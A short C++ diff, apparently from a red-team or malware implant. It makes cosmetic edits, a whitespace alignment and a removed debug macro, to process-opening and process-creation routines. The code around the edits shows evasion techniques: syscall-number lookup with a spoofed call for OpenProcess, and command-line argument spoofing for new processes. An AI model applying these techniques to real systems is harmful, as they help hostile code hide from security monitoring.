@@ -14,7 +14,7 @@ auto DECLFN Process::Open(
     if ( ! Flags ) return Self->Krnl32.OpenProcess( RightsAccess, InheritHandle, ProcessID );
 
     UPTR Address = SYS_ADDR( Sys::OpenProc );
-    UPTR ssn = SYS_SSN( Sys::OpenProc );
+    UPTR ssn     = SYS_SSN( Sys::OpenProc );
 
     Status = Self->Spf->Call(
         Address, ssn, (UPTR)&Handle, (UPTR)RightsAccess,
@@ -134,7 +134,6 @@ auto DECLFN Process::Create(
     }
 
     if ( Self->Config.Ps.SpoofArg ) {
-        KH_DBG_MSG
         if ( Str::LengthW( CommandLine ) > Str::LengthW( Self->Config.Ps.SpoofArg ) ) {
             QuickMsg( "Spoofed Arguments must be smaller then Legit Command Line: %s", CommandLine );
             return Cleanup();
